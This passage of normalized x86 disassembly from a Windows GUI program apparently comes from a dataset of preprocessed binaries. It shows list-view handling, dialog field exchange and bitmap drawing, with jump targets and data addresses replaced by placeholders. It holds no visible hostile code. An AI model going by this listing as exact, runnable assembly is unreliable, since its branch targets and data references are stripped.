mov ecx edi
call sub_413580
lea ecx [ esp + 0x8 ]
mov [ esp + 0x8c ] 0x0
call sub_442148
push eax
push eax
push rw-data
call sub_4496b7
lea ecx [ esp + 0x80 ]
mov [ esp + 0x8c ] 0x5
call sub_442148
lea ecx [ esp + 0x7c ]
mov [ esp + 0x8c ] 0x4
call sub_442148
lea ecx [ esp + 0x78 ]
mov [ esp + 0x8c ] 0x3
call sub_442148
lea ecx [ esp + 0x70 ]
mov [ esp + 0x8c ] 0x2
call sub_442148
mov [ esp + 0x8c ] 0x1
jmp r-xdata
lea ecx [ esp + 0x6c ]
call sub_442148
lea ecx [ esp + 0x10 ]
mov [ esp + 0x8c ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x84 ]
pop edi
mov [ fs : 0x0 ] ecx
pop esi
add esp 0x88
retn
sub_413980
push 0xffffffff
push sub_460294
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
lea ecx [ esi + 0x70 ]
mov [ esp + 0x10 ] 0x4
call sub_442148
lea ecx [ esi + 0x6c ]
mov [ esp + 0x10 ] 0x3
call sub_442148
lea ecx [ esi + 0x68 ]
mov [ esp + 0x10 ] 0x2
call sub_442148
lea ecx [ esi + 0x60 ]
mov [ esp + 0x10 ] 0x1
call sub_442148
lea ecx [ esi + 0x5c ]
mov [ esp + 0x10 ] 0x0
call sub_442148
mov ecx esi
mov [ esp + 0x10 ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_413a00
push 0xffffffff
push sub_4602a8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push esi
mov esi ecx
push 0x1
call sub_440b18
mov eax [ rw-data ]
mov [ esp + 0x4 ] eax
mov eax [ esi + 0x98 ]
mov [ esp + 0x14 ] 0x0
test eax eax
jne r-xdata
cmp eax 0x1
jne r-xdata
mov ecx [ esi + 0x9c ]
push ecx
push rw-data
cmp eax 0x2
jne r-xdata
mov eax [ esi + 0x9c ]
lea ecx [ esp + 0x4 ]
push eax
push rw-data
push ecx
call sub_43b5cc
add esp 0xc
jmp r-xdata
push ecx
lea edx [ esp + 0x8 ]
mov ecx esp
mov [ esp + 0xc ] esp
push edx
call sub_441ebd
mov ecx esi
call sub_413580
lea ecx [ esp + 0x4 ]
mov [ esp + 0x14 ] 0xffffffff
call sub_442148
mov ecx [ esp + 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
cmp eax 0x3
jne r-xdata
mov edx [ esi + 0x9c ]
lea eax [ esp + 0x4 ]
push edx
push rw-data
push eax
call sub_43b5cc
add esp 0xc
jmp r-xdata
cmp eax 0x4
jne r-xdata
mov ecx [ esi + 0x9c ]
push ecx
push rw-data
jmp r-xdata
lea ecx [ esp + 0x4 ]
push rw-data
push ecx
lea eax [ esp + 0x4 ]
push rw-data
push eax
jmp r-xdata
lea edx [ esp + 0xc ]
push edx
call sub_43b5cc
add esp 0xc
jmp r-xdata
call sub_43b5cc
add esp 0x8
sub_413b10
push 0xffffffff
push sub_460389
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x80
push ebx
push ebp
push esi
push edi
mov edi ecx
push 0x0
lea ecx [ esp + 0x20 ]
call sub_4144c0
push 0x1
mov ecx edi
mov [ esp + 0x9c ] 0x0
call sub_440b18
mov eax [ edi + 0x78 ]
push 0x0
push 0x0
push 0x1042
push eax
call [ SendMessageA@IAT ]
mov ebx eax
test ebx ebx
jge r-xdata
mov ecx [ rw-data ]
mov [ esp + 0x10 ] ecx
lea ebp [ edi + 0x5c ]
push 0x0
lea edx [ esp + 0x18 ]
push ebx
push edx
mov ecx ebp
mov [ esp + 0xa4 ] 0x6
call sub_43c1f0
mov eax [ eax ]
lea ecx [ esp + 0x10 ]
push eax
push rw-data
push ecx
mov [ esp + 0xa4 ] 0x7
call sub_43b5cc
add esp 0xc
lea ecx [ esp + 0x14 ]
mov [ esp + 0x98 ] 0x6
call sub_442148
mov eax [ esp + 0x10 ]
mov edx [ edi + 0xa0 ]
lea esi [ edi + 0xa0 ]
push 0x0
push eax
push 0xffffffff
mov ecx esi
call [ edx + 0xc ]
test eax eax
jne r-xdata
push 0x0
push 0x0
push rw-data
call sub_4496b7
lea ecx [ esp + 0x8c ]
mov [ esp + 0x98 ] 0x5
call sub_442148
lea ecx [ esp + 0x88 ]
mov [ esp + 0x98 ] 0x4
call sub_442148
lea ecx [ esp + 0x84 ]
mov [ esp + 0x98 ] 0x3
call sub_442148
lea ecx [ esp + 0x7c ]
mov [ esp + 0x98 ] 0x2
call sub_442148
mov [ esp + 0x98 ] 0x1
jmp r-xdata
lea eax [ edi + 0x1b4 ]
lea ecx [ esp + 0x88 ]
push eax
call sub_442281
lea eax [ edi + 0x1c4 ]
lea ecx [ esp + 0x84 ]
push eax
call sub_442281
mov ecx [ edi + 0x1c8 ]
lea eax [ edi + 0x1bc ]
mov [ esp + 0x80 ] ecx
push eax
lea ecx [ esp + 0x7c ]
call sub_442281
lea eax [ edi + 0x1c0 ]
lea ecx [ esp + 0x8c ]
push eax
call sub_442281
lea eax [ edi + 0x1b8 ]
lea ecx [ esp + 0x7c ]
push eax
call sub_442281
mov edx [ esi ]
mov ecx esi
call [ edx + 0x10 ]
lea ecx [ esp + 0x1c ]
call sub_43de8a
cmp eax 0x1
jne r-xdata
push eax
push eax
push rw-data
call sub_4496b7
lea ecx [ esp + 0x10 ]
mov [ esp + 0x98 ] 0x0
call sub_442148
lea ecx [ esp + 0x8c ]
mov [ esp + 0x98 ] 0xc
call sub_442148
lea ecx [ esp + 0x88 ]
mov [ esp + 0x98 ] 0xb
call sub_442148
lea ecx [ esp + 0x84 ]
mov [ esp + 0x98 ] 0xa
call sub_442148
lea ecx [ esp + 0x7c ]
mov [ esp + 0x98 ] 0x9
call sub_442148
mov [ esp + 0x98 ] 0x8
jmp r-xdata
lea ecx [ esp + 0x78 ]
call sub_442148
lea ecx [ esp + 0x1c ]
mov [ esp + 0x98 ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x90 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x8c
retn
lea ecx [ esp + 0x10 ]
mov [ esp + 0x98 ] 0x0
call sub_442148
lea ecx [ esp + 0x8c ]
mov [ esp + 0x98 ] 0x17
call sub_442148
lea ecx [ esp + 0x88 ]
mov [ esp + 0x98 ] 0x16
call sub_442148
lea ecx [ esp + 0x84 ]
mov [ esp + 0x98 ] 0x15
call sub_442148
lea ecx [ esp + 0x7c ]
mov [ esp + 0x98 ] 0x14
call sub_442148
mov [ esp + 0x98 ] 0x13
push 0x0
lea eax [ esp + 0x18 ]
push ebx
push eax
mov ecx ebp
call sub_43c1f0
mov ecx [ eax ]
lea edx [ esp + 0x10 ]
push ecx
push rw-data
push edx
mov [ esp + 0xa4 ] 0xd
call sub_43b5cc
add esp 0xc
lea ecx [ esp + 0x14 ]
mov [ esp + 0x98 ] 0x6
call sub_442148
mov ecx [ esp + 0x10 ]
mov eax [ esi ]
push 0x0
push ecx
push 0xffffffff
mov ecx esi
call [ eax + 0xc ]
test eax eax
jne r-xdata
mov edx [ esi ]
mov ecx esi
call [ edx + 0x24 ]
lea eax [ esp + 0x88 ]
lea ecx [ edi + 0x1b4 ]
push eax
call sub_442281
lea ecx [ esp + 0x84 ]
push ecx
lea ecx [ edi + 0x1c4 ]
call sub_442281
mov edx [ esp + 0x80 ]
lea eax [ esp + 0x78 ]
push eax
lea ecx [ edi + 0x1bc ]
mov [ edi + 0x1c8 ] edx
call sub_442281
lea ecx [ esp + 0x8c ]
push ecx
lea ecx [ edi + 0x1c0 ]
call sub_442281
lea edx [ esp + 0x7c ]
lea ecx [ edi + 0x1b8 ]
push edx
call sub_442281
mov eax [ esi ]
mov ecx esi
call [ eax + 0x28 ]
mov edx [ esi ]
mov ecx esi
call [ edx + 0x10 ]
push rw-data
lea ecx [ esp + 0x14 ]
call sub_4422d1
push ecx
lea eax [ esp + 0x14 ]
mov ecx esp
mov [ esp + 0x1c ] esp
push eax
call sub_441ebd
mov ecx edi
call sub_413580
push eax
push eax
push rw-data
call sub_4496b7
lea ecx [ esp + 0x10 ]
mov [ esp + 0x98 ] 0x0
call sub_442148
lea ecx [ esp + 0x8c ]
mov [ esp + 0x98 ] 0x12
call sub_442148
lea ecx [ esp + 0x88 ]
mov [ esp + 0x98 ] 0x11
call sub_442148
lea ecx [ esp + 0x84 ]
mov [ esp + 0x98 ] 0x10
call sub_442148
lea ecx [ esp + 0x7c ]
mov [ esp + 0x98 ] 0xf
call sub_442148
mov [ esp + 0x98 ] 0xe
jmp r-xdata
sub_413f50
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4603b0
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push esi
push edi
mov edi ecx
push 0x0
push 0x0
push 0x1042
mov eax [ edi + 0x78 ]
push eax
call [ SendMessageA@IAT ]
test eax eax
jge r-xdata
mov ecx [ rw-data ]
mov [ esp + 0x8 ] ecx
push 0x0
lea edx [ esp + 0x10 ]
push eax
push edx
lea ecx [ edi + 0x5c ]
mov [ esp + 0x28 ] 0x0
call sub_43c1f0
mov eax [ eax ]
lea ecx [ esp + 0x8 ]
push eax
push rw-data
push ecx
mov [ esp + 0x28 ] 0x1
call sub_43b5cc
add esp 0xc
lea ecx [ esp + 0xc ]
mov [ esp + 0x1c ] 0x0
call sub_442148
mov eax [ esp + 0x8 ]
mov edx [ edi + 0xa0 ]
lea esi [ edi + 0xa0 ]
push 0x0
push eax
push 0xffffffff
mov ecx esi
call [ edx + 0xc ]
test eax eax
jne r-xdata
push 0x0
push 0x0
push rw-data
call sub_4496b7
mov ecx [ esp + 0x14 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
add esp 0x18
retn
mov edx [ esi ]
mov ecx esi
call [ edx + 0x2c ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0x10 ]
push rw-data
lea ecx [ esp + 0xc ]
call sub_4422d1
push ecx
lea edx [ esp + 0xc ]
mov ecx esp
mov [ esp + 0x14 ] esp
push edx
call sub_441ebd
mov ecx edi
call sub_413580
push eax
push eax
push rw-data
call sub_4496b7
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov [ esp + 0x1c ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x14 ]
pop edi
mov [ fs : 0x0 ] ecx
pop esi
add esp 0x18
retn
sub_414070
push 0xffffffff
push sub_460489
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x80
push ebx
push ebp
push esi
push edi
mov edi ecx
push 0x0
lea ecx [ esp + 0x20 ]
call sub_4144c0
push 0x1
mov ecx edi
mov [ esp + 0x9c ] 0x0
call sub_440b18
mov eax [ edi + 0x78 ]
push 0x0
push 0x0
push 0x1042
push eax
call [ SendMessageA@IAT ]
mov ebx eax
test ebx ebx
jge r-xdata
mov ecx [ rw-data ]
mov [ esp + 0x10 ] ecx
lea ebp [ edi + 0x5c ]
push 0x0
lea edx [ esp + 0x18 ]
push ebx
push edx
mov ecx ebp
mov [ esp + 0xa4 ] 0x6
call sub_43c1f0
mov eax [ eax ]
lea ecx [ esp + 0x10 ]
push eax
push rw-data
push ecx
mov [ esp + 0xa4 ] 0x7
call sub_43b5cc
add esp 0xc
lea ecx [ esp + 0x14 ]
mov [ esp + 0x98 ] 0x6
call sub_442148
mov eax [ esp + 0x10 ]
mov edx [ edi + 0xa0 ]
lea esi [ edi + 0xa0 ]
push 0x0
push eax
push 0xffffffff
mov ecx esi
call [ edx + 0xc ]
test eax eax
jne r-xdata
push 0x0
push 0x0
push rw-data
call sub_4496b7
lea ecx [ esp + 0x8c ]
mov [ esp + 0x98 ] 0x5
call sub_442148
lea ecx [ esp + 0x88 ]
mov [ esp + 0x98 ] 0x4
call sub_442148
lea ecx [ esp + 0x84 ]
mov [ esp + 0x98 ] 0x3
call sub_442148
lea ecx [ esp + 0x7c ]
mov [ esp + 0x98 ] 0x2
call sub_442148
mov [ esp + 0x98 ] 0x1
jmp r-xdata
lea eax [ edi + 0x1b4 ]
lea ecx [ esp + 0x88 ]
push eax
call sub_442281
lea eax [ edi + 0x1c4 ]
lea ecx [ esp + 0x84 ]
push eax
call sub_442281
mov ecx [ edi + 0x1c8 ]
lea eax [ edi + 0x1bc ]
mov [ esp + 0x80 ] ecx
push eax
lea ecx [ esp + 0x7c ]
call sub_442281
lea eax [ edi + 0x1c0 ]
lea ecx [ esp + 0x8c ]
push eax
call sub_442281
lea eax [ edi + 0x1b8 ]
lea ecx [ esp + 0x7c ]
push eax
call sub_442281
mov edx [ esi ]
mov ecx esi
call [ edx + 0x10 ]
lea ecx [ esp + 0x1c ]
call sub_43de8a
cmp eax 0x1
jne r-xdata
push eax
push eax
push rw-data
call sub_4496b7
lea ecx [ esp + 0x10 ]
mov [ esp + 0x98 ] 0x0
call sub_442148
lea ecx [ esp + 0x8c ]
mov [ esp + 0x98 ] 0xc
call sub_442148
lea ecx [ esp + 0x88 ]
mov [ esp + 0x98 ] 0xb
call sub_442148
lea ecx [ esp + 0x84 ]
mov [ esp + 0x98 ] 0xa
call sub_442148
lea ecx [ esp + 0x7c ]
mov [ esp + 0x98 ] 0x9
call sub_442148
mov [ esp + 0x98 ] 0x8
jmp r-xdata
lea ecx [ esp + 0x78 ]
call sub_442148
lea ecx [ esp + 0x1c ]
mov [ esp + 0x98 ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x90 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x8c
retn 0x8
mov ecx [ esp + 0xa4 ]
mov [ esp + 0x98 ] 0x0
mov [ ecx ] 0x0
lea ecx [ esp + 0x10 ]
call sub_442148
lea ecx [ esp + 0x8c ]
mov [ esp + 0x98 ] 0x17
call sub_442148
lea ecx [ esp + 0x88 ]
mov [ esp + 0x98 ] 0x16
call sub_442148
lea ecx [ esp + 0x84 ]
mov [ esp + 0x98 ] 0x15
call sub_442148
lea ecx [ esp + 0x7c ]
mov [ esp + 0x98 ] 0x14
call sub_442148
mov [ esp + 0x98 ] 0x13
push 0x0
lea eax [ esp + 0x18 ]
push ebx
push eax
mov ecx ebp
call sub_43c1f0
mov ecx [ eax ]
lea edx [ esp + 0x10 ]
push ecx
push rw-data
push edx
mov [ esp + 0xa4 ] 0xd
call sub_43b5cc
add esp 0xc
lea ecx [ esp + 0x14 ]
mov [ esp + 0x98 ] 0x6
call sub_442148
mov ecx [ esp + 0x10 ]
mov eax [ esi ]
push 0x0
push ecx
push 0xffffffff
mov ecx esi
call [ eax + 0xc ]
test eax eax
jne r-xdata
mov edx [ esi ]
mov ecx esi
call [ edx + 0x24 ]
lea eax [ esp + 0x88 ]
lea ecx [ edi + 0x1b4 ]
push eax
call sub_442281
lea ecx [ esp + 0x84 ]
push ecx
lea ecx [ edi + 0x1c4 ]
call sub_442281
mov edx [ esp + 0x80 ]
lea eax [ esp + 0x78 ]
push eax
lea ecx [ edi + 0x1bc ]
mov [ edi + 0x1c8 ] edx
call sub_442281
lea ecx [ esp + 0x8c ]
push ecx
lea ecx [ edi + 0x1c0 ]
call sub_442281
lea edx [ esp + 0x7c ]
lea ecx [ edi + 0x1b8 ]
push edx
call sub_442281
mov eax [ esi ]
mov ecx esi
call [ eax + 0x28 ]
mov edx [ esi ]
mov ecx esi
call [ edx + 0x10 ]
push rw-data
lea ecx [ esp + 0x14 ]
call sub_4422d1
push ecx
lea eax [ esp + 0x14 ]
mov ecx esp
mov [ esp + 0x1c ] esp
push eax
call sub_441ebd
mov ecx edi
call sub_413580
push eax
push eax
push rw-data
call sub_4496b7
lea ecx [ esp + 0x10 ]
mov [ esp + 0x98 ] 0x0
call sub_442148
lea ecx [ esp + 0x8c ]
mov [ esp + 0x98 ] 0x12
call sub_442148
lea ecx [ esp + 0x88 ]
mov [ esp + 0x98 ] 0x11
call sub_442148
lea ecx [ esp + 0x84 ]
mov [ esp + 0x98 ] 0x10
call sub_442148
lea ecx [ esp + 0x7c ]
mov [ esp + 0x98 ] 0xf
call sub_442148
mov [ esp + 0x98 ] 0xe
jmp r-xdata
sub_4144c0
push 0xffffffff
push sub_4604df
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push ebx
push ebp
push esi
push edi
mov esi ecx
push eax
push 0x8a
mov [ esp + 0x18 ] esi
call sub_43ddd5
mov edx [ rw-data ]
lea ecx [ esi + 0x5c ]
mov [ esp + 0x1c ] 0x0
mov [ ecx ] edx
mov eax [ rw-data ]
lea edi [ esi + 0x60 ]
mov [ edi ] eax
mov edx [ rw-data ]
lea ebx [ esi + 0x68 ]
mov [ ebx ] edx
mov eax [ rw-data ]
lea ebp [ esi + 0x6c ]
mov [ ebp ] eax
mov edx [ rw-data ]
mov [ esi + 0x70 ] edx
push rw-data
mov [ esp + 0x20 ] 0x5
mov [ esi ] r--data
call sub_4422d1
push rw-data
mov ecx edi
call sub_4422d1
push rw-data
mov ecx ebx
mov [ esi + 0x64 ] 0x0
call sub_4422d1
push rw-data
mov ecx ebp
call sub_4422d1
push rw-data
lea ecx [ esi + 0x70 ]
call sub_4422d1
mov ecx [ esp + 0x14 ]
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_4145b0
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
lea eax [ esi + 0x5c ]
push eax
push 0x414
push edi
call sub_449495
lea ecx [ esi + 0x60 ]
push ecx
push 0x416
push edi
call sub_449495
lea edx [ esi + 0x64 ]
push edx
push 0x415
push edi
call sub_4257ba
lea eax [ esi + 0x68 ]
push eax
push 0x418
push edi
call sub_4493f1
lea ecx [ esi + 0x6c ]
push ecx
push 0x3eb
push edi
call sub_4493f1
add esi 0x70
push esi
push 0x417
push edi
call sub_4493f1
pop edi
pop esi
retn 0x4
sub_414640
push esi
mov esi ecx
push 0x1
call sub_440b18
mov eax [ esi + 0x6c ]
mov ecx [ eax - 0x8 ]
test ecx ecx
jne r-xdata
mov ecx [ esi + 0x5c ]
mov eax [ ecx - 0x8 ]
test eax eax
jne r-xdata
push 0x0
push 0x0
push rw-data
call sub_4496b7
pop esi
retn
mov edx [ esi + 0x60 ]
mov eax [ edx - 0x8 ]
test eax eax
jne r-xdata
push 0x0
push 0x0
push rw-data
call sub_4496b7
pop esi
retn
mov eax [ esi + 0x70 ]
mov ecx [ eax - 0x8 ]
test ecx ecx
jne r-xdata
push 0x0
push 0x0
push rw-data
call sub_4496b7
pop esi
retn
mov ecx esi
call sub_43e178
pop esi
retn
push 0x0
push 0x0
push rw-data
call sub_4496b7
pop esi
retn
sub_4146d0
push 0xffffffff
push sub_46053e
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push ebx
push ebp
push esi
push edi
mov esi ecx
push eax
mov [ esp + 0x14 ] esi
call sub_421517
mov edx [ rw-data ]
lea ecx [ esi + 0x114 ]
mov [ esp + 0x1c ] 0x0
mov [ ecx ] edx
mov eax [ rw-data ]
lea edi [ esi + 0x118 ]
mov [ edi ] eax
mov edx [ rw-data ]
lea ebx [ esi + 0x11c ]
mov [ ebx ] edx
mov eax [ rw-data ]
lea ebp [ esi + 0x120 ]
mov [ ebp ] eax
mov edx [ rw-data ]
mov [ esi + 0x124 ] edx
push rw-data
mov [ esp + 0x20 ] 0x5
mov [ esi ] r--data
mov [ esi + 0x110 ] 0x0
call sub_4422d1
push rw-data
mov ecx edi
call sub_4422d1
push rw-data
mov ecx ebx
call sub_4422d1
push rw-data
mov ecx ebp
call sub_4422d1
push rw-data
lea ecx [ esi + 0x124 ]
call sub_4422d1
mov ecx [ esp + 0x14 ]
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x8c ] 0x1
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_414810
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
lea eax [ esi + 0x110 ]
push eax
push rw-data
push edi
mov [ edi + 0x8 ] 0x0
call sub_424ab5
push 0x0
push 0xc
lea ecx [ esi + 0x114 ]
push 0xff
push ecx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea edx [ esi + 0x118 ]
push 0xff
push edx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea eax [ esi + 0x11c ]
push 0xff
push eax
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea ecx [ esi + 0x120 ]
push 0xff
push ecx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea edx [ esi + 0x124 ]
push 0xff
push edx
push rw-data
push edi
call sub_4246fa
add esi 0x128
push esi
push rw-data
push edi
call sub_424cfa
pop edi
pop esi
retn 0x4
sub_414970
push 0xffffffff
push sub_4605e5
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x104
push ebx
xor ebx ebx
push esi
mov esi ecx
push ebx
call sub_425811
add esp 0x4
push rw-data
push rw-data
push 0x1
push ebx
call sub_4375a2
mov ecx esi
call sub_4549a9
push rw-data
mov ecx esi
call sub_454717
push 0x4
mov ecx esi
call sub_453e44
push ebx
lea ecx [ esp + 0x34 ]
call sub_40eff0
lea ecx [ esp + 0x30 ]
mov [ esp + 0x114 ] ebx
call sub_43de8a
cmp eax 0x1
je r-xdata
push 0x68
call sub_441e89
add esp 0x4
mov [ esp + 0x8 ] eax
cmp eax ebx
mov [ esp + 0x114 ] 0x5
je r-xdata
lea ecx [ esp + 0x108 ]
mov [ esp + 0x114 ] 0x4
call sub_442148
lea ecx [ esp + 0x104 ]
mov [ esp + 0x114 ] 0x3
call sub_442148
lea ecx [ esp + 0xc8 ]
mov [ esp + 0x114 ] 0x2
call sub_44f0ac
lea ecx [ esp + 0x8c ]
mov [ esp + 0x114 ] 0x1
call sub_44f153
lea ecx [ esp + 0x30 ]
mov [ esp + 0x114 ] 0xffffffff
call sub_43da87
pop esi
xor eax eax
pop ebx
mov ecx [ esp + 0x104 ]
mov [ fs : 0x0 ] ecx
add esp 0x110
retn
xor eax eax
push r--data
push r--data
push r--data
push 0x80
mov ecx eax
call sub_445266
jmp r-xdata
mov ecx [ esi + 0x1c ]
push 0x3
call sub_4417ff
mov eax [ esi + 0x1c ]
mov edx [ eax + 0x1c ]
push edx
call [ UpdateWindow@IAT ]
mov ecx [ esi + 0x1c ]
push rw-data
call sub_4416d5
lea ecx [ esp + 0xc ]
mov [ esp + 0x114 ] bl
call sub_453f6e
lea ecx [ esp + 0x108 ]
mov [ esp + 0x114 ] 0xe
call sub_442148
lea ecx [ esp + 0x104 ]
mov [ esp + 0x114 ] 0xd
call sub_442148
lea ecx [ esp + 0xc8 ]
mov [ esp + 0x114 ] 0xc
call sub_44f0ac
lea ecx [ esp + 0x8c ]
mov [ esp + 0x114 ] 0xb
call sub_44f153
lea ecx [ esp + 0x30 ]
mov [ esp + 0x114 ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x10c ]
pop esi
mov eax 0x1
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x110
retn
lea ecx [ esp + 0xc ]
mov [ esp + 0x114 ] bl
call sub_453f6e
lea ecx [ esp + 0x108 ]
mov [ esp + 0x114 ] 0xa
call sub_442148
lea ecx [ esp + 0x104 ]
mov [ esp + 0x114 ] 0x9
call sub_442148
lea ecx [ esp + 0xc8 ]
mov [ esp + 0x114 ] 0x8
call sub_44f0ac
lea ecx [ esp + 0x8c ]
mov [ esp + 0x114 ] 0x7
call sub_44f153
lea ecx [ esp + 0x30 ]
mov [ esp + 0x114 ] 0xffffffff
call sub_43da87
pop esi
xor eax eax
pop ebx
mov ecx [ esp + 0x104 ]
mov [ fs : 0x0 ] ecx
add esp 0x110
retn
push eax
mov ecx esi
mov [ esp + 0x118 ] bl
call sub_44ac7f
lea ecx [ esp + 0xc ]
call sub_453f13
lea eax [ esp + 0xc ]
mov ecx esi
push eax
mov [ esp + 0x118 ] 0x6
call sub_453ec0
lea ecx [ esp + 0xc ]
push ecx
mov ecx esi
call sub_4543b4
test eax eax
jne r-xdata
sub_414c90
push 0xffffffff
push sub_4605f8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x5c
lea ecx [ esp ]
call sub_414c30
lea ecx [ esp ]
mov [ esp + 0x64 ] 0x0
call sub_43de8a
lea ecx [ esp ]
mov [ esp + 0x64 ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x5c ]
mov [ fs : 0x0 ] ecx
add esp 0x68
retn
sub_414cf0
push 0xffffffff
push sub_46061a
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push 0x50
call sub_441e89
add esp 0x4
mov [ esp ] eax
test eax eax
mov [ esp + 0xc ] 0x0
je r-xdata
mov ecx [ esp + 0x4 ]
xor eax eax
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov ecx eax
call sub_414d70
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_414df0
push 0xffffffff
push sub_46063a
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push 0x40
call sub_441e89
add esp 0x4
mov [ esp ] eax
test eax eax
mov [ esp + 0xc ] 0x0
je r-xdata
mov ecx [ esp + 0x4 ]
xor eax eax
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov ecx eax
call sub_414e70
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_414ef0
push 0xffffffff
push sub_460672
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x6c
push ebx
push ebp
push esi
push edi
mov edi ecx
push 0x54
call sub_441e89
add esp 0x4
mov [ esp + 0x10 ] eax
xor ebx ebx
cmp eax ebx
mov [ esp + 0x84 ] ebx
je r-xdata
xor esi esi
push edi
mov ecx eax
call sub_447621
mov esi eax
jmp r-xdata
mov eax [ esi + 0x4 ]
xor eax eax
jmp r-xdata
mov [ esp + 0x18 ] ebx
mov [ esp + 0x14 ] r--data
lea ecx [ esp + 0x34 ]
mov [ esp + 0x84 ] 0x1
call sub_446b68
mov [ esp + 0x84 ] 0x2
call sub_45357b
mov eax [ eax + 0xc ]
push 0xa9
push eax
call [ LoadBitmapA@IAT ]
push eax
lea ecx [ esp + 0x18 ]
call sub_447761
cmp esi ebx
jne r-xdata
mov edi ecx
mov [ esp + 0x2c ] eax
mov [ esp + 0x24 ] edi
sub eax ebp
mov [ esp + 0x2c ] ebp
cdq
sub eax edx
mov edi eax
sar edi 0x1
add edi ecx
mov [ esp + 0x24 ] edi
jmp r-xdata
push eax
call [ CreateCompatibleDC@IAT ]
push eax
lea ecx [ esp + 0x38 ]
call sub_446c1f
mov ebx [ esp + 0x18 ]
lea eax [ esp + 0x14 ]
neg eax
sbb eax eax
and eax ebx
push eax
mov eax [ esp + 0x3c ]
push eax
call sub_446d60
mov ecx [ esi + 0x8 ]
push ecx
call [ GetMapMode@IAT ]
push eax
lea ecx [ esp + 0x38 ]
call sub_446f0f
mov eax [ esp + 0x18 ]
lea edx [ esp + 0x64 ]
push edx
push 0x18
push eax
call [ GetObjectA@IAT ]
mov edx [ edi + 0x1c ]
mov ebx [ GetClientRect@IAT ]
lea ecx [ esp + 0x54 ]
push ecx
push edx
call ebx
mov eax [ esp + 0x68 ]
mov ecx [ esp + 0x6c ]
mov [ esp + 0x1c ] eax
mov [ esp + 0x20 ] ecx
mov eax [ esi + 0x8 ]
lea edx [ esp + 0x1c ]
push 0x1
push edx
push eax
call [ DPtoLP@IAT ]
mov edx [ edi + 0x1c ]
lea ecx [ esp + 0x44 ]
push ecx
push edx
call ebx
lea eax [ esp + 0x44 ]
lea ecx [ esp + 0x24 ]
push eax
push ecx
call [ CopyRect@IAT ]
mov eax [ esp + 0x4c ]
mov ecx [ esp + 0x44 ]
mov ebp [ esp + 0x68 ]
sub eax ecx
cmp eax ebp
jle r-xdata
mov eax ecx
mov [ esp + 0x28 ] eax
mov eax edx
sub eax ebx
cdq
sub eax edx
mov edx ebx
sar eax 0x1
add eax ecx
mov [ esp + 0x28 ] eax
jmp r-xdata
mov edx [ esp + 0x50 ]
mov ecx [ esp + 0x48 ]
mov ebx [ esp + 0x6c ]
sub edx ecx
cmp edx ebx
jle r-xdata
lea ecx [ esp + 0x34 ]
push 0xcc0020
neg ecx
sbb ecx ecx
push ebx
and ecx [ esp + 0x40 ]
push ebp
push 0x0
push 0x0
push ecx
mov [ esp + 0x48 ] edx
push edx
mov edx [ esp + 0x48 ]
push edx
push eax
mov eax [ esi + 0x4 ]
push edi
push eax
call [ StretchBlt@IAT ]
lea ecx [ esp + 0x34 ]
call sub_446c87
lea ecx [ esp + 0x34 ]
mov [ esp + 0x84 ] 0x1
call sub_446c9d
mov [ esp + 0x14 ] r--data
lea ecx [ esp + 0x14 ]
mov [ esp + 0x84 ] 0x3
call sub_4477b8
mov ecx [ esp + 0x7c ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x78
retn
sub_415130
push 0xffffffff
push sub_460688
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov [ esp ] ecx
mov [ ecx ] r--data
mov [ esp + 0xc ] 0x0
call sub_4477b8
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
